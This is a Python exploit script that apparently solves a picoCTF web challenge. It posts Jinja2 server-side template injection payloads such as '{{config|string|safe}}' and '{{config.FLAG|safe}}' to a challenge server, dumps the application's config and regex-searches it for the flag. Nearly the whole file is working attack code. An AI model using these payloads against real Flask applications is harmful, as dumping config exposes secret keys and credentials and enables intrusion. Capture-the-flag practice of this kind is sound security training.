#!/usr/bin/env python3
import requests
import re

url = "http://shape-facility.picoctf.net:57197/"

print("=== Getting the flag from config ===\n")

# We found that {{config|string|safe}} shows the config
# Let's get the full output
payload = "{{config|string|safe}}"

response = requests.post(url, data={"content": payload}, timeout=10)
result = response.text

print("Full config output:")
print("="*50)

# Extract just the config part
import html
decoded = html.unescape(result)
print(decoded)

print("\n" + "="*50)
print("Searching for flag...")

# Look for the flag pattern
flag_pattern = re.compile(r'picoCTF\{[^}]+\}', re.IGNORECASE)
matches = flag_pattern.findall(decoded)

if matches:
    print(f"\n🚩 FLAG FOUND: {matches[0]}")
else:
    # Maybe it's in a different format
    # Look for FLAG or flag keys
    if "FLAG" in decoded or "flag" in decoded:
        print("\nFound FLAG reference in config!")
        # Extract the part around FLAG
        lines = decoded.split(',')
        for line in lines:
            if 'flag' in line.lower():
                print(f"  {line.strip()}")
    
    # Try to get more of the config
    print("\nTrying to get more config details...")
    
    # Try different approaches to see more
    more_payloads = [
        "{{config|string}}",
        "{{config.FLAG|safe}}",
        "{{config.flag|safe}}",
        "{{config.SECRET_FLAG|safe}}",
        "{{config.CTF_FLAG|safe}}",
    ]
    
    for p in more_payloads:
        response = requests.post(url, data={"content": p}, timeout=5)
        if "picoctf" in response.text.lower():
            decoded = html.unescape(response.text)
            matches = flag_pattern.findall(decoded)
            if matches:
                print(f"\n🚩 FLAG FOUND with {p}: {matches[0]}")
                break